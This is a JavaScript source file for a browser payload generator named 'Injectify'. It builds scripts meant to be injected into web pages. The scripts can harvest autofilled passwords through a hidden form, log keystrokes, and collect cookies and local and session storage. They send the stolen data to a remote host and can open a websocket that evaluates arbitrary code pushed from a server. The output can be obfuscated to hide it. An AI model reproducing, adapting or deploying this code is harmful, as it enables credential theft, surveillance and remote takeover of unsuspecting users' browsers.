"use strict";
exports.__esModule = true;
var chalk_1 = require("chalk");
var UglifyJS = require('uglify-es');
var ObfuscateJS = require('js-obfuscator');
var beautify = require('js-beautify').js_beautify;
var btoa = require('btoa');
var config = require('../../server.config.js').injectify;
exports["default"] = function (query) {
    return new Promise(function (resolve, reject) {
        function enc(string, enableEval) {
            if (query.base64 === 'false') {
                if (enableEval) {
                    return string;
                }
                else {
                    return '"' + string + '"';
                }
            }
            else {
                if (enableEval) {
                    return 'eval(atob("' + btoa(string) + '"))';
                }
                else {
                    return 'atob("' + btoa(string) + '")';
                }
            }
        }
        function comment(message) {
            if (query.comments === 'true') {
                return '\n// ' + message;
            }
            else {
                return '';
            }
        }
        function ifPassword(script) {
            if (query.passwords === 'false') {
                return '';
            }
            else {
                return script + '\n';
            }
        }
        function ifNotPassword(script) {
            if (query.passwords === 'false') {
                return script + '\n';
            }
            else {
                return '';
            }
        }
        function debug(script) {
            if (query.debug === 'true') {
                return '\n' + script;
            }
            else {
                return '';
            }
        }
        function sendToServer(url) {
            if (config.dev)
                url = '"http:"+' + url;
            if (bypassCors) {
                return 'window.location=' + url + '+"$"';
            }
            else {
                return enc('c.src=' + url, true);
            }
        }
        var valid = true;
        if (!query.project)
            valid = false;
        var inject = false;
        if (query.inject === 'true')
            inject = true;
        var keylogger = false;
        if (query.keylogger === 'true')
            keylogger = true;
        var screenSize = true;
        if (query.screenSize === 'false')
            screenSize = false;
        var location = true;
        if (query.location === 'false')
            location = false;
        var localStorage = true;
        if (query.localStorage === 'false')
            localStorage = false;
        var sessionStorage = true;
        if (query.sessionStorage === 'false')
            sessionStorage = false;
        var cookies = true;
        if (query.cookies === 'false')
            cookies = false;
        var bypassCors = false;
        if (query.bypassCors === 'true')
            bypassCors = true;
        var proxy = '//uder.ml/'; // '//injectify.samdd.me/'
        if (query.proxy)
            proxy = query.proxy;
        var wss = 'wss:';
        if (config.dev) {
            proxy = '//localhost:' + config.express + '/';
            wss = 'ws:';
        }
        var injectProject = btoa(query.project);
        if (query.debug === 'true')
            injectProject = '$' + injectProject;
        var help = "\n    // \u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    // \u2502     Injectify payload engine \u00A9      \u2502\n    // \u2502   INTELLECTUAL PROPERTY OF SAMDD    \u2502\n    // \u251C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n    // \u2502 GET_PARAM      \u2502 TYPE    \u2502 DEFAULT  \u2502\n    // \u251C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n    // \u2502 project        \u2502 STRING  \u2502 REQUIRED \u2502\n    // \u2502 proxy          \u2502 URL     \u2502 NONE     \u2502\n    // \u2502 base64         \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2502 obfuscate      \u2502 BOOLEAN \u2502 FALSE    \u2502\n    // \u2502 minify         \u2502 BOOLEAN \u2502 FALSE    \u2502\n    // \u2502 comments       \u2502 BOOLEAN \u2502 FALSE    \u2502\n    // | debug          | BOOLEAN | FALSE    |\n    // | bypassCors     | BOOLEAN | FALSE    |\n    // \u2502                \u2502         \u2502          \u2502\n    // | inject         \u2502 BOOLEAN \u2502 FALSE    |\n    // | passwords      \u2502 BOOLEAN \u2502 TRUE     |\n    // | keylogger      \u2502 BOOLEAN \u2502 FALSE    |\n    // \u2502 screenSize     \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2502 location       \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2502 localStorage   \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2502 sessionStorage \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2502 cookies        \u2502 BOOLEAN \u2502 TRUE     \u2502\n    // \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518";
        if (valid) {
            var variables = '';
            var json = '';
            var body = '';
            var catcher = '';
            var injectScript = void 0;
            if (inject) {
                var websocket = "'" + wss + "'+p+'i/websocket?" + injectProject + "'";
                if (query.passwords === 'false' && keylogger === false)
                    websocket = "'" + wss + proxy + "i/websocket?" + injectProject + "'";
                body += "\n          function u() {" + comment('Open a new websocket to the server') + "\n            window.ws = new WebSocket(" + websocket + ")\n            ws.onmessage = function(d) {\n                try {" + comment('Parse the websocket message as JSON') + "\n                    d = JSON.parse(d.data)" + comment('Evaluate the javascript') + "\n                    eval(d.d)\n                } catch(e) {" + comment('On error send error back to server') + "\n                    ws.send(JSON.stringify({\n                        t: 'e',\n                        d: e.stack,\n                    }))\n                }\n            }\n            ws.onclose = function() {" + comment('Attempt to re-open the websocket, retrying every 3 seconds') + "\n                setTimeout(u, 3000)\n            }\n          }\n          u()\n        ";
                injectScript = body;
            }
            if (keylogger) {
                variables += 'm = {}, f = [], g = new Date().getTime(),';
                body += comment('add listeners to the window for keydown & keyup events') + "\n          k.onkeydown = k.onkeyup = function (n) {\n            var l = ''," + comment('give the keycode number to variables h & z') + "\n              h = n.key,\n              z = h" + comment("if the key type ends with p => then it's keyup") + "\n            if (n.type.slice(-1) == 'p') l = '_'" + comment('append the keyup / keydown indicator') + "\n            z += l" + comment('ignore multiple modifier calls & invalid key presses') + "\n            if (m == z || !h) return" + comment('Push to array') + "\n            f.push(z)" + comment('update the value of the last m(odifier) key press') + "\n            if (h.length > 1) m = z\n            " + debug("\n              if (n.key && n.key.length > 1) {\n                console.log('%c[keylogger@INJECTIFY] %cModifier key state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)\n              } else {\n                console.log('%c[keylogger@INJECTIFY] %cKey state changed', 'color: #ef5350; font-weight: bold', 'color: #FF9800', n)\n              }\n            ") + "\n          }\n  \n          setInterval(function() {" + comment('if the array is empty, skip making a request') + "\n            if (!f.length) return\n            i = {\n              a: atob(\"" + btoa(query.project) + "\"),\n              t: 1,\n              b: g,\n              c: f,\n              d: k.location.href,\n              j: d.title\n            }\n            " + sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + "\n            f = []\n          }, 3000)\n        ";
            }
            if (screenSize) {
                variables += 'j = k.screen,';
                json += 'e: j.height, f: j.width,';
            }
            if (location)
                json += 'd: k.location.href, j: d.title,';
            if (localStorage)
                catcher += 'i.g = localStorage,';
            if (sessionStorage)
                catcher += 'i.h = sessionStorage,';
            if (cookies)
                json += 'i: d.cookie,';
            if (variables)
                variables = ',' + variables.slice(0, -1);
            if (json)
                json = ',' + json.slice(0, -1);
            if (catcher) {
                if (query.debug === 'true') {
                    catcher = '\n' + catcher.slice(0, -1);
                }
                else {
                    catcher = '\ntry {' + comment('attempt to insert the local & session storage into object, but ignore if it fails\n') + catcher.slice(0, -1) + '} catch(error) {}\n\n';
                }
            }
            var script_1 = help + "\n      //  Project name    | " + query.project + "\n  \n  \n      " + injectScript;
            if (!(query.passwords === 'false' && keylogger === false)) {
                script_1 = help + "\n        //  Project name    | " + query.project + "\n  \n  \n        var d = document," +
                    ifPassword("\n            v = " + enc('input') + ",\n            w = d.createElement(" + enc('form') + "),\n            x = d.createElement(v),\n            y,") +
                    "c = " + enc('new Image()', true) + ",\n          p = " + enc(proxy) + ",\n          i,\n          k = window" + variables +
                    ifPassword("\n" +
                        comment('name attribute is required for autofill to work') + "\n          x.name = \"\"" +
                        comment('autofill still works if the elements are non-rendered') + "\n          x.style = " + enc('display:none') + "\n          " +
                        comment('clone the input node instead of declaring it again') + "\n          y = x.cloneNode()" +
                        comment('set the input type to password') + "\n          y.type = " + enc('password') + "\n          " +
                        comment('append elements to form node') + "\n          w.appendChild(x)\n          w.appendChild(y)" +
                        comment('append form node to DOM') + "\n          d.body.appendChild(w)") + '\n' +
                    body +
                    ifPassword(comment("add a listener to the password input, browser's autofiller will trigger this") + "\n          y.addEventListener(v, function () {" + comment('construct a global object with data to extract')) + ifNotPassword("\n") +
                    "i = {\n            a: atob(\"" + btoa(query.project) + "\"),\n            t: 0" +
                    ifPassword(",\n              b: x.value,\n              c: y.value") + json + "\n          }\n          " + catcher +
                    ifPassword(debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)\n")) +
                    comment('send a request to the server (or proxy) with the BASE64 encoded JSON object\n') +
                    sendToServer("p+'r/'+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") +
                    ifPassword(comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + "\n            w.remove()\n            })");
                /// ////////////////////////////////////////////////////////////////////////
            }
            if (query.obfuscate === 'true') {
                ObfuscateJS(script_1).then(function (obfuscated) {
                    resolve(obfuscated);
                }, function (err) {
                    resolve(UglifyJS.minify(script_1).code);
                });
            }
            else if (query.minify === 'true') {
                resolve(UglifyJS.minify(script_1).code);
            }
            else {
                resolve(beautify(script_1, {
                    indent_size: 2
                }));
            }
        }
        else {
            var script = help;
            reject(beautify(script, {
                indent_size: 2
            }));
        }
        if (config.debug) {
            console.log(chalk_1["default"].greenBright('[Payload] ') +
                chalk_1["default"].yellowBright('generated for project ') +
                chalk_1["default"].magentaBright(query.project));
        }
    });
};
